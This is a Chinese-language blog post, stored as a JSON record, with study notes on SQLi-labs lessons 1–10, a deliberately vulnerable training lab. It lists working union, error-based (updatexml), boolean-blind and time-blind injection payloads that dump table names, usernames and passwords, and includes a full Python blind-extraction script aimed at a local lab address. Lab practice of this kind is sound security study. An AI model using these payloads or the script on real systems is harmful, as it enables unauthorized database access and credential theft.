{"title":"sql-labs-less1-10","uid":"e7ef7d94b3e4c91873147e11ef254294","slug":"sql-labs-less1-10","date":"2022-10-28T11:34:39.000Z","updated":"2022-10-28T11:38:57.497Z","comments":true,"path":"api/articles/sql-labs-less1-10.json","keywords":null,"cover":null,"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<p>什么理解总结都不如做题，做多了就有套路了</p>\n<p>答案：<a href=\"https://blog.csdn.net/elephantxiang/article/details/119684515\">https://blog.csdn.net/elephantxiang/article/details/119684515</a></p>\n<h3 id=\"全程无图\"><a href=\"#全程无图\" class=\"headerlink\" title=\"全程无图\"></a>全程无图</h3><h3 id=\"less1：\"><a href=\"#less1：\" class=\"headerlink\" title=\"less1：\"></a>less1：</h3><p> id=’$id’</p>\n<p>单引号报错，ordey by 字段为3</p>\n<p>union注入需要前面是错误的内容</p>\n<p>user() database() version()</p>\n<p><strong>group_concat() 将所有结果当成一条返回</strong></p>\n<p>获取所有表名</p>\n<p>group_concat(table_name) from information_schema.tables where table_schema=database() –+</p>\n<p>获取users表的所有字段名</p>\n<p>group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=database() –+</p>\n<p>获取所有用户名和密码</p>\n<p>group_concat(username),group_concat(password) from users –+</p>\n<h4 id=\"sql注入写入webshell\"><a href=\"#sql注入写入webshell\" class=\"headerlink\" title=\"sql注入写入webshell\"></a>sql注入写入webshell</h4><p><a href=\"https://blog.csdn.net/weixin_43749601/article/details/115280242\">https://blog.csdn.net/weixin_43749601/article/details/115280242</a></p>\n<h3 id=\"less2：\"><a href=\"#less2：\" class=\"headerlink\" title=\"less2：\"></a>less2：</h3><p>id=$id</p>\n<p>and 1=1， and 1=2</p>\n<p>不用闭合，直接注入 order by 3 –+ </p>\n<p>剩下的和less1一样</p>\n<h3 id=\"less3：\"><a href=\"#less3：\" class=\"headerlink\" title=\"less3：\"></a>less3：</h3><p>id=(‘$id’)</p>\n<p>使用 ‘) 闭合报错</p>\n<p>加上  –+ 注释  不报错，证明闭合正确</p>\n<p>剩下和less1一样，还是手打一遍，有助于记忆</p>\n<p>-1’) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() –+</p>\n<p>-1’) union select 1,2,group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema = database() –+</p>\n<p>-1’) union select 1,group_concat(username),group_concat(password) from users –+</p>\n<h3 id=\"less4\"><a href=\"#less4\" class=\"headerlink\" title=\"less4:\"></a>less4:</h3><p>id=”($id)”</p>\n<p>and 1=1 and 1=2 正常返回</p>\n<p>‘ 闭合 正常返回</p>\n<p>“ 闭合 报错语句有 )</p>\n<p>“) –+  返回正常  闭合正确</p>\n<p>和less1一样，练练</p>\n<p>-1”) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() –+</p>\n<p>-1”) union select 1,2,group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema = database() –+</p>\n<p>-1”) union select 1,group_concat(username),group_concat(password) from users –+</p>\n<h3 id=\"less5：\"><a href=\"#less5：\" class=\"headerlink\" title=\"less5：\"></a>less5：</h3><p>and 1=1 and 1=2  正常</p>\n<p>‘  报错</p>\n<p>‘ –+ 正常 ， 闭合成功</p>\n<p>页面只显示 you are in … ，说明是无回显，有报错使用报错注入</p>\n<p><strong>updatexml()</strong> </p>\n<p>函数介绍：<a href=\"https://blog.csdn.net/m0_60988110/article/details/123544853\">https://blog.csdn.net/m0_60988110/article/details/123544853</a></p>\n<p>updatexml(xml_doument,XPath_string,new_value)</p>\n<p>第一个参数：XML的内容</p>\n<p>第二个参数：是需要update的位置XPATH路径</p>\n<p>第三个参数：是更新后的内容</p>\n<p>所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式</p>\n<p><strong>concat()</strong> 连接字符串，字符串有一个为null，返回结果为null</p>\n<p>获取数据库名</p>\n<p>1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+</p>\n<p>其中0x7e只是十六进制的分隔符~  </p>\n<p><strong>concat_ws()</strong> 最前面使用0x7e，这样每个内容都会使用0x7e分割</p>\n<p>concat_ws(0x7e,username,password)    返回 admin<del>123456</del></p>\n<p>中间写入正常注入语句就行</p>\n<p>获取所有表名</p>\n<p>1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1) –+</p>\n<p>如果输出内容有<strong>长度限制</strong>，可以使用**substr()**函数切割字符串</p>\n<p>1’ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),1,7),0x7e),1) –+</p>\n<p>返回<del>emails,</del></p>\n<p>获取users表所有字段</p>\n<p>1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema = database()),0x7e),1) –+</p>\n<p>获取users表中所有账号</p>\n<p>1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) –+</p>\n<p>获取users表中所有密码</p>\n<p>1’ and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) –+</p>\n<h3 id=\"less6：\"><a href=\"#less6：\" class=\"headerlink\" title=\"less6：\"></a>less6：</h3><p>and 1=1 and 1=2  ‘ 正常</p>\n<p>“ 报错，” –+ 正常  闭合成功</p>\n<p>和less5一样，报错注入</p>\n<p>表名</p>\n<p>1” and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1) –+</p>\n<p>字段名</p>\n<p>1” and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema = database()),0x7e),1) –+</p>\n<p>账号</p>\n<p>1” and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) –+</p>\n<p>密码</p>\n<p>1” and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) –+</p>\n<h3 id=\"less7：\"><a href=\"#less7：\" class=\"headerlink\" title=\"less7：\"></a>less7：</h3><p>正常流程 “ –+ 回显正常，闭合成功，诡哦! 看源码才知道使用 ‘))闭合才是对的</p>\n<p><strong>这个过程应该是，先让他报错，之后再尝试注释，让其显示正常</strong></p>\n<p><strong>这个”  直接显示正常所以不对</strong></p>\n<p>那为啥没有报错，是双引号特性吗?</p>\n<p><strong>这里需要一个mysql终端测试。。。。</strong></p>\n<p>无回显，无报错，显示使用outfile</p>\n<p>可以使用布尔盲注</p>\n<p>1’)) and <strong>length</strong>(database()) &gt;? –+ </p>\n<p>一个个测试，结果为8</p>\n<p>使用<strong>substring</strong>提取database()每一个字符，一个个比较获取结果</p>\n<p>1’)) and substring(database(),1,1) = ‘?’ –+</p>\n<p>在length() 里能执行正常语句，获取表名长度</p>\n<p>1’)) and length((select group_concat(table_name) from information_schema.tables where table_schema =database())) &gt; ? –+</p>\n<p>记得括号 () ，结果是29</p>\n<p>一样提取字符</p>\n<p>1’)) and substring((select group_concat(table_name) from information_schema.tables where table_schema =database()),1,1) = ‘?’ –+</p>\n<p>获取字段名长度</p>\n<p>1’)) and length((select group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema =database())) &gt; ? –+</p>\n<p> 结果是20，获取字符</p>\n<p>1’)) and substring((select group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema =database()),1,1) = ‘?’ –+</p>\n<p>获取账号长度</p>\n<p>1’)) and length((select group_concat(username) from users )) &gt; ? –+</p>\n<p>结果是91，提取账号字符</p>\n<p>1’)) and substring((select group_concat(username) from users )) = ‘?’ –+</p>\n<p>获取密码长度</p>\n<p>1’)) and length((select group_concat(password) from users )) &gt; ? –+</p>\n<p>结果是97，提取密码字符</p>\n<p>1’)) and substring((select group_concat(password) from users )) = ‘?’ –+</p>\n<p>这样弄好麻烦，在条件允许的情况下，阔以用脚本跑，但是脚本也很慢</p>\n<p>在挖src等，只需要证明危害既可</p>\n<h4 id=\"脚本：\"><a href=\"#脚本：\" class=\"headerlink\" title=\"脚本：\"></a>脚本：</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"># -*— codeing &#x3D; utf-8 -*-\n# @Time :2022-10-28 14:30\n# @Author : longw\n# @File : sqllab7-booleanblind.py\n# @Software : PyCharm\nimport requests\nimport re\n\nbaseurl &#x3D; &quot;http:&#x2F;&#x2F;192.168.0.108:86&#x2F;Less-7&#x2F;?id&#x3D;&quot;\npayload1 &#x3D; &quot;1&#39;)) and length(database()) &gt; &quot;\npayload2 &#x3D; &quot;1&#39;)) and substring(database(),&quot;\npayload3 &#x3D; &quot;1&#39;)) and length((select group_concat(table_name) from information_schema.tables where table_schema &#x3D;database())) &gt; &quot;\npayload4 &#x3D; &quot;1&#39;)) and substring((select group_concat(table_name) from information_schema.tables where table_schema &#x3D;database()),&quot;\npayload5 &#x3D; &quot;,1) &#x3D; &quot;\npayload6 &#x3D; &quot;1&#39;)) and length((select group_concat(column_name) from information_schema.columns where table_name &#x3D; &#39;users&#39; and table_schema &#x3D;database())) &gt; &quot;\npayload7 &#x3D; &quot;1&#39;)) and substring((select group_concat(column_name) from information_schema.columns where table_name &#x3D; &#39;users&#39; and table_schema &#x3D;database()),&quot;\nend &#x3D; &quot; --+&quot;\n\nheaders &#x3D; &#123;\n    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.121 Safari&#x2F;537.36&quot; &#125;\n                    # http request报文头部，根据实际情况填写\nfeatures &#x3D; &#39;You are in.... Use outfile......&#39;\n\nzifu &#x3D; [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;,\n            &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;,&#39;,\n            &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;,\n            &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;]\n#用二分法判断长度快，但是懒得考虑\ndef ScanDatabase():\n    i&#x3D;1\n    while i &lt;&#x3D; 100:\n        url &#x3D; baseurl+payload1+str(i)+end\n        response &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n        # print(url)\n        if re.search(features, response.text) &#x3D;&#x3D; None:\n            print(&quot;数据库长度为：&quot; +str(i))\n            break\n        else:\n            if i &#x3D;&#x3D; 100:\n                print(&#39;范围不够&#39;)\n            i &#x3D; i + 1\n    #只考虑数据库名全为字母\n    #学习一波大佬生成的列表：https:&#x2F;&#x2F;github.com&#x2F;JacquelinXiang&#x2F;sqli_bool\n    #这个注入结果可能需要等到明年，你妹的\n    # keylist &#x3D; [chr(i) for i in range(33, 127)]  # 包括数字、大小写字母、可见特殊字符\n    database &#x3D; &#39;&#39;\n    k&#x3D;1\n    while k &lt;&#x3D; i:\n        for j in zifu:\n            url &#x3D; baseurl+payload2+ str(k) + payload5 +&quot;&#39;&quot; +j+&quot;&#39;&quot;+ end\n            response1 &#x3D; requests.get(url, headers&#x3D;headers,timeout&#x3D;5)\n            # print(url)\n            if re.search(features, response1.text) !&#x3D; None:\n                print(&quot;第&quot;+str(k)+&quot;个字符为：&quot;+ str(j))\n                database &#x3D; database + j\n                k &#x3D; k+1\n                break\n            else:\n                #先测试小写就行，反正结果就是小写\n                if j &#x3D;&#x3D; &#39;z&#39;:\n                    print(&quot;第&quot;+str(k)+&quot;个字符不是字母，请注意！！！&quot;)\n                    database &#x3D; database + &#39;x&#39;\n                    k &#x3D; k +1\n                    break\n    print(&quot;数据库名为：&quot;+database)\n\ndef ScanTables():\n    i &#x3D; 1\n    while i &lt;&#x3D; 100:\n        url &#x3D; baseurl + payload3 + str(i) + end\n        response &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n        # print(url)\n        if re.search(features, response.text) &#x3D;&#x3D; None:\n            print(&quot;表名长度为：&quot; + str(i))\n            break\n        else:\n            if i &#x3D;&#x3D; 100:\n                print(&#39;范围不够&#39;)\n            i &#x3D; i + 1\n    # 只考虑数据库名全为字母\n    database &#x3D; &#39;&#39;\n    k &#x3D; 1\n    while k &lt;&#x3D; i:\n        for j in zifu:\n            url &#x3D; baseurl + payload4 + str(k) + payload5 + &quot;&#39;&quot; + j + &quot;&#39;&quot; + end\n            response1 &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n            # print(url)\n            if re.search(features, response1.text) !&#x3D; None:\n                print(&quot;第&quot; + str(k) + &quot;个字符为：&quot; + str(j))\n                database &#x3D; database + j\n                k &#x3D; k + 1\n                break\n            else:\n                \n                if j &#x3D;&#x3D; &#39;Z&#39;:\n                    print(&quot;第&quot; + str(k) + &quot;个字符不是字母，请注意！！！&quot;)\n                    database &#x3D; database + &#39;?&#39;\n                    k &#x3D; k + 1\n                    break\n    print(&quot;所有表名为：&quot; + database)\n\ndef ScanColumns():\n    i &#x3D; 1\n    while i &lt;&#x3D; 100:\n        url &#x3D; baseurl + payload6 + str(i) + end\n        response &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n        # print(url)\n        if re.search(features, response.text) &#x3D;&#x3D; None:\n            print(&quot;users表所有字段长度为：&quot; + str(i))\n            break\n        else:\n            if i &#x3D;&#x3D; 100:\n                print(&#39;范围不够&#39;)\n            i &#x3D; i + 1\n    # 只考虑数据库名全为字母\n    database &#x3D; &#39;&#39;\n    k &#x3D; 1\n    while k &lt;&#x3D; i:\n        for j in zifu:\n            url &#x3D; baseurl + payload7 + str(k) + payload5 + &quot;&#39;&quot; + j + &quot;&#39;&quot; + end\n            response1 &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n            # print(url)\n            if re.search(features, response1.text) !&#x3D; None:\n                print(&quot;第&quot; + str(k) + &quot;个字符为：&quot; + str(j))\n                database &#x3D; database + j\n                k &#x3D; k + 1\n                break\n            else:\n                if j &#x3D;&#x3D; &#39;Z&#39;:\n                    print(&quot;第&quot; + str(k) + &quot;个字符不是字母，请注意！！！&quot;)\n                    database &#x3D; database + &#39;?&#39;\n                    k &#x3D; k + 1\n                    break\n    print(&quot;users库所有字段名为：&quot; + database)\n\n#其他都一样，后面两个太长不弄了\nScanDatabase()\n# ScanTables()\n# ScanColumns()\n\n#测试\n# response &#x3D; requests.get(baseurl, headers&#x3D;headers)\n# print(response.text)\n# body &#x3D; response.text\n# print(re.search(features, body))</code></pre>\n\n<h3 id=\"less8：\"><a href=\"#less8：\" class=\"headerlink\" title=\"less8：\"></a>less8：</h3><p>and 1=1 and 1=2 正常</p>\n<p>‘ 报错 ‘ –+ 正常  闭合成功</p>\n<p>又是布尔盲注，和less7一样，改一下payload就行，不弄了</p>\n<h3 id=\"less9：\"><a href=\"#less9：\" class=\"headerlink\" title=\"less9：\"></a>less9：</h3><p>and 1=1  and 1=2  ‘  “ 都显示正常</p>\n<p>只能尝试时间盲注了</p>\n<p>1’ and if(1=1,sleep(3),0) –+   有很明显的三秒延时，说明是 ‘  闭合</p>\n<p>接下来就是和前面一样的注入尝试</p>\n<p>1’ and if(length(database())&gt;?,sleep(3),0) –+</p>\n<p>剩下的就是替换</p>\n<h3 id=\"less10：\"><a href=\"#less10：\" class=\"headerlink\" title=\"less10：\"></a>less10：</h3><p>and 1=1 and 1=2 ‘ “ 都正常</p>\n<p>测试时间盲注</p>\n<p>1 and if(1=1,sleep(3),0) –+</p>\n<p>1’ and if(1=1,sleep(3),0) –+</p>\n<p>1” and if(1=1,sleep(3),0) –+   有反应了，闭合成功</p>\n<p>剩下和前面一样</p>\n<h3 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h3><p>测试流程</p>\n<p>先数字，再字符，都是看页面报错</p>\n<p>有错误，来注释，依然报错尝试添加其他符号闭合,直到页面正常</p>\n<p>闭合成功看页面，有回显，union，无回显，布尔盲注</p>\n<p>无错误，测试时间盲注payload，再按照前面闭合流程走一遍</p>\n<p>找到闭合方式，以及注入方式，后面才讲bypass</p>\n<h4 id=\"盲注框架：\"><a href=\"#盲注框架：\" class=\"headerlink\" title=\"盲注框架：\"></a>盲注框架：</h4><p><a href=\"https://github.com/JacquelinXiang/sqli_blind\">https://github.com/JacquelinXiang/sqli_blind</a></p>\n","text":" 什么理解总结都不如做题，做多了就有套路了 答案：https://blog.csdn.net/elephantxiang/article/details/119684515 全程无图less1： id=’$id’ 单引号报错，ordey by 字段为3 union注入需要前面是错...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[{"name":"靶场","slug":"靶场","count":1,"path":"api/categories/靶场.json"}],"tags":[{"name":"sql注入","slug":"sql注入","count":1,"path":"api/tags/sql注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%A8%E7%A8%8B%E6%97%A0%E5%9B%BE\"><span class=\"toc-text\">全程无图</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#less1%EF%BC%9A\"><span class=\"toc-text\">less1：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#sql%E6%B3%A8%E5%85%A5%E5%86%99%E5%85%A5webshell\"><span class=\"toc-text\">sql注入写入webshell</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#less2%EF%BC%9A\"><span class=\"toc-text\">less2：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#less3%EF%BC%9A\"><span class=\"toc-text\">less3：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#less4\"><span class=\"toc-text\">less4:</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#less5%EF%BC%9A\"><span class=\"toc-text\">less5：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#less6%EF%BC%9A\"><span class=\"toc-text\">less6：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#less7%EF%BC%9A\"><span class=\"toc-text\">less7：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%84%9A%E6%9C%AC%EF%BC%9A\"><span class=\"toc-text\">脚本：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#less8%EF%BC%9A\"><span class=\"toc-text\">less8：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#less9%EF%BC%9A\"><span class=\"toc-text\">less9：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#less10%EF%BC%9A\"><span class=\"toc-text\">less10：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%B0%8F%E7%BB%93%EF%BC%9A\"><span class=\"toc-text\">小结：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%9B%B2%E6%B3%A8%E6%A1%86%E6%9E%B6%EF%BC%9A\"><span class=\"toc-text\">盲注框架：</span></a></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"快看cms-sql注入审计","uid":"880e1af7df287b27c3dd9350df565202","slug":"快看cms-sql注入审计","date":"2022-11-04T07:47:54.000Z","updated":"2022-11-04T08:44:26.404Z","comments":true,"path":"api/articles/快看cms-sql注入审计.json","keywords":null,"cover":[],"text":" 安装：https://github.com/erichuang2015/kkcms 直接安装 php5.6.9 数据库 kk 先直接使用Seay扫描，接下来一个一个看扫描结果 sql注入疑似点：book.php&lt;?php include(&#39;system&#x2F;...","link":"","photos":[],"count_time":{"symbolsCount":"20k","symbolsTime":"18 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":1,"path":"api/categories/代码审计.json"}],"tags":[{"name":"PHP","slug":"PHP","count":2,"path":"api/tags/PHP.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"5.0-5.0.23RCE漏洞复现","uid":"02bb8134dce40015108a5a765c734167","slug":"TP5-0-5-0-23RCE","date":"2022-10-19T13:20:47.000Z","updated":"2022-10-19T13:42:05.365Z","comments":true,"path":"api/articles/TP5-0-5-0-23RCE.json","keywords":null,"cover":[],"text":" 参考文章：https://mp.weixin.qq.com/s/DGWuSdB2DvJszom0C_dkoQ https://y4tacker.blog.csdn.net/article/details/115893304 https://mp.weixin.qq.com/s/...","link":"","photos":[],"count_time":{"symbolsCount":"29k","symbolsTime":"26 mins."},"categories":[{"name":"RCE","slug":"RCE","count":1,"path":"api/categories/RCE.json"}],"tags":[{"name":"thinphp","slug":"thinphp","count":1,"path":"api/tags/thinphp.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}